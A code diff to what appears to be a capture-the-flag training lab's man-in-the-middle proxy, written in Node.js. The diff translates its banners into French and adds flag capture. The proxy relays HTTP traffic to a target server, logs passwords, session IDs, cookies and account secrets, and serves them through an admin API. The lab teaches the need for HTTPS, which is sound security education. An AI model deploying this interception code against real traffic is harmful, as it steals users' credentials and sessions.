@@ -17,7 +17,8 @@ const interceptedData = {
   sessions: [],
   cookies: [],
   requests: [],
-  responses: []
+  responses: [],
+  flags: []
 };
 
 // Middleware
@@ -64,11 +65,11 @@ app.use((req, res, next) => {
 
     console.log(`
 ╔═══════════════════════════════════════════╗
-║  🎯 CREDENTIALS INTERCEPTED!              ║
+║  IDENTIFIANTS INTERCEPTÉS !               ║
 ╠═══════════════════════════════════════════╣
-║  Username: ${username.padEnd(30)}║
-║  Password: ${password.padEnd(30)}║
-║  Time: ${timestamp.substring(0, 19)}     ║
+║  Utilisateur: ${username.padEnd(26)}║
+║  Mot de passe: ${password.padEnd(25)}║
+║  Heure: ${timestamp.substring(0, 19)}    ║
 ╚═══════════════════════════════════════════╝
     `);
   }
@@ -81,7 +82,7 @@ app.use((req, res, next) => {
       cookies: req.headers.cookie
     });
 
-    log('Cookies intercepted', { cookies: req.headers.cookie });
+    log('Cookies interceptés', { cookies: req.headers.cookie });
   }
 
   // Logger toutes les requêtes
@@ -99,10 +100,10 @@ app.use((req, res, next) => {
 // Proxy toutes les requêtes vers le serveur victime
 app.use('/', (req, res) => {
   proxy.web(req, res, {}, (err) => {
-    console.error('Proxy error:', err);
+    console.error('Erreur proxy:', err);
     res.status(500).json({
       success: false,
-      message: 'Proxy error',
+      message: 'Erreur proxy',
       error: err.message
     });
   });
@@ -143,27 +144,61 @@ proxy.on('proxyRes', (proxyRes, req, res) => {
 
       console.log(`
 ╔═══════════════════════════════════════════╗
-║  🔑 SESSION HIJACKED!                     ║
+║  SESSION DÉTOURNÉE !                      ║
 ╠═══════════════════════════════════════════╣
-║  User: ${(user.username || '').padEnd(34)}║
-║  Role: ${(user.role || '').padEnd(34)}║
+║  Utilisateur: ${(user.username || '').padEnd(26)}║
+║  Rôle: ${(user.role || '').padEnd(33)}║
 ║  Session: ${(sessionId || '').substring(0, 28)}  ║
-║  Time: ${timestamp.substring(0, 19)}     ║
+║  Heure: ${timestamp.substring(0, 19)}    ║
 ╚═══════════════════════════════════════════╝
       `);
     }
 
     // Capturer les données sensibles du compte
     if (req.url === '/api/account' && parsedBody.success) {
+      const secret = parsedBody.user.secret || '';
+      const username = parsedBody.user.username || '';
+      
       console.log(`
 ╔═══════════════════════════════════════════╗
-║  💳 SENSITIVE DATA INTERCEPTED!           ║
+║  DONNÉES SENSIBLES INTERCEPTÉES !         ║
 ╠═══════════════════════════════════════════╣
-║  User: ${(parsedBody.user.username || '').padEnd(34)}║
-║  Secret: ${(parsedBody.user.secret || '').substring(0, 32).padEnd(32)}║
-║  Balance: $${String(parsedBody.user.balance || 0).padEnd(29)}║
+║  Utilisateur: ${username.padEnd(26)}║
+║  Secret: ${secret.substring(0, 32).padEnd(32)}║
+║  Solde: $${String(parsedBody.user.balance || 0).padEnd(30)}║
 ╚═══════════════════════════════════════════╝
       `);
+
+      // Vérifier si c'est un FLAG
+      const flagMatch = secret.match(/FLAG\{[^}]+\}/);
+      if (flagMatch && username === 'admin') {
+        const capturedFlag = flagMatch[0];
+        
+        // Ajouter le flag si pas déjà capturé
+        if (!interceptedData.flags.find(f => f.flag === capturedFlag)) {
+          interceptedData.flags.push({
+            timestamp,
+            flag: capturedFlag,
+            username: username,
+            method: 'Interception de données du compte MITM'
+          });
+
+          console.log(`
+╔═══════════════════════════════════════════════════════╗
+║  FLAG CAPTURÉ ! ATTAQUE MITM RÉUSSIE !                ║
+╠═══════════════════════════════════════════════════════╣
+║  ${capturedFlag.padEnd(52)}║
+║                                                       ║
+║  Félicitations ! Vous avez réussi une attaque        ║
+║  Man-in-the-Middle et intercepté le flag secret      ║
+║  de l'admin depuis un trafic non chiffré.            ║
+║                                                       ║
+║  Vecteur d'attaque: Interception trafic HTTP         ║
+║  Leçon: Toujours utiliser le chiffrement HTTPS !     ║
+╚═══════════════════════════════════════════════════════╝
+          `);
+        }
+      }
     }
 
     // Logger les réponses
@@ -179,7 +214,7 @@ proxy.on('proxyRes', (proxyRes, req, res) => {
     if (req.url === '/api/account' && parsedBody.success) {
       // Exemple: Voler le flag et le remplacer
       const stolenSecret = parsedBody.user.secret;
-      console.log(`[MITM] 🏴 Stolen secret: ${stolenSecret}`);
+      console.log(`[MITM] Secret volé: ${stolenSecret}`);
       
       // On pourrait modifier ici:
       // parsedBody.user.secret = "Secret stolen by attacker!";
@@ -220,6 +255,17 @@ adminApp.get('/intercepted/cookies', (req, res) => {
   });
 });
 
+adminApp.get('/intercepted/flags', (req, res) => {
+  res.json({
+    success: true,
+    count: interceptedData.flags.length,
+    data: interceptedData.flags,
+    message: interceptedData.flags.length > 0 
+      ? 'FLAG CAPTURÉ ! Attaque MITM réussie !' 
+      : 'Aucun flag capturé pour le moment. Essayez d\'intercepter les données du compte admin.'
+  });
+});
+
 adminApp.get('/intercepted/all', (req, res) => {
   res.json({
     success: true,
@@ -227,9 +273,11 @@ adminApp.get('/intercepted/all', (req, res) => {
       credentials: interceptedData.credentials,
       sessions: interceptedData.sessions,
       cookies: interceptedData.cookies,
+      flags: interceptedData.flags,
       totalRequests: interceptedData.requests.length,
       totalResponses: interceptedData.responses.length
-    }
+    },
+    flagCaptured: interceptedData.flags.length > 0
   });
 });
 
@@ -239,10 +287,11 @@ adminApp.post('/intercepted/clear', (req, res) => {
   interceptedData.cookies = [];
   interceptedData.requests = [];
   interceptedData.responses = [];
+  interceptedData.flags = [];
 
   res.json({
     success: true,
-    message: 'All intercepted data cleared'
+    message: 'Toutes les données interceptées ont été effacées'
   });
 });
 
@@ -257,24 +306,25 @@ adminApp.get('/health', (req, res) => {
 
 // Démarrer le serveur admin sur un port différent
 adminApp.listen(8889, () => {
-  console.log(`📊 MITM Admin API running on port 8889`);
+  console.log(`API Admin MITM en cours d'exécution sur le port 8889`);
 });
 
 app.listen(PORT, () => {
   console.log(`
 ╔═══════════════════════════════════════════════════════╗
-║  🕵️  MITM PROXY ACTIVE                                 ║
+║  PROXY MITM ACTIF                                     ║
 ╠═══════════════════════════════════════════════════════╣
-║  Proxy Port: ${PORT}                                      ║
-║  Target: ${TARGET_URL}                      ║
-║  Admin API: http://localhost:8889                     ║
-║  Debug Mode: ${DEBUG_MODE ? 'ON ' : 'OFF'}                                  ║
+║  Port Proxy: ${PORT}                                      ║
+║  Cible: ${TARGET_URL}                       ║
+║  API Admin: http://localhost:8889                     ║
+║  Mode Debug: ${DEBUG_MODE ? 'ON ' : 'OFF'}                                  ║
 ╠═══════════════════════════════════════════════════════╣
-║  ⚠️  This proxy intercepts and logs ALL traffic!       ║
-║     - Credentials (username/password)                 ║
-║     - Session IDs and cookies                         ║
-║     - Sensitive data transmission                     ║
-║     - Request/Response modification capability        ║
+║  ATTENTION: Ce proxy intercepte et enregistre TOUT    ║
+║  le trafic !                                          ║
+║     - Identifiants (nom d'utilisateur/mot de passe)  ║
+║     - IDs de session et cookies                       ║
+║     - Transmission de données sensibles               ║
+║     - Capacité de modification Requête/Réponse        ║
 ╚═══════════════════════════════════════════════════════╝
   `);
 });
